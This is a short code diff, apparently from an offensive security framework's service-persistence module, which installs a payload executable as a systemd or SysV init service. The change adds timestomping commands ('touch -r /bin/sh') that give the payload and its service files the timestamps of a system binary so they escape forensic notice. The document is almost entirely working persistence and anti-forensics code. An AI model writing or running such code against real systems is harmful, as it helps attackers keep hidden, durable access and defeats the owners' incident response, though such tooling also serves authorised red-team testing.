@@ -238,6 +238,8 @@ def systemd(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
+    sys.shell(f"touch -r /bin/sh {executable_path}")
+    sys.shell(f"touch -r /bin/sh /usr/lib/systemd/system/{service_name}.service")
 
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
@@ -258,6 +260,8 @@ def sysvinit(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
+    sys.shell(f"touch -r /bin/sh {executable_path}")
+    sys.shell(f"touch -r /bin/sh /etc/init.d/{service_name}")
 
     sys.shell("update-rc.d "+service_name+" defaults")
     sys.shell("service "+service_name+" start")
